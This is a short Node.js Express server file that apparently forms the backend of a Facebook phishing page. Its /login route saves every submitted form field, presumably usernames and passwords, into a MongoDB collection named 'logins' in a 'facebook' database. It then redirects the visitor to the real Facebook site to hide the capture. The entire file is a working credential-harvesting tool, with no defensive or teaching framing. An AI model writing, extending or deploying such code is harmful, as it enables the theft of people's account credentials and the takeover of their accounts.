require('dotenv').config();
const express = require('express');
const app = express();
const { MongoClient } = require('mongodb');
const { resolve } = require('path');
const PORT = process.env.PORT ?? 3001;

app.use(express.static(resolve('client')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => res.sendFile(resolve('client', 'index.html')));

const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);

async function saveLogin(data) {
	try {
		await client.connect();
		const database = client.db('facebook');
		const collection = database.collection('logins');

		const result = await collection.insertOne(data);
	} finally {
		await client.close();
	}
}

app.post('/login', async (req, res) => {
	const data = req.body;
	await saveLogin(req.body);
	res.redirect('https://web.facebook.com/?_rdc=1&_rdr');
});

module.exports = app;
